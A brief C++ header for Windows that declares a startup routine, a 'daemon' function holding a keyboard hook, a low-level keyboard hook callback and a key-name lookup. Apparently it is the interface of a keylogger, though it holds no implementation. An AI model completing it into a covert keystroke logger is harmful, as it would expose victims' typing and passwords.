#ifndef DEAMON_H
#define DEAMON_H
#include <windows.h>
#include <string>

void startup();
void winDeamon(HHOOK* kbd);
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
std::string GetKeyName(unsigned int virtualKey);

#endif // DEAMON_H
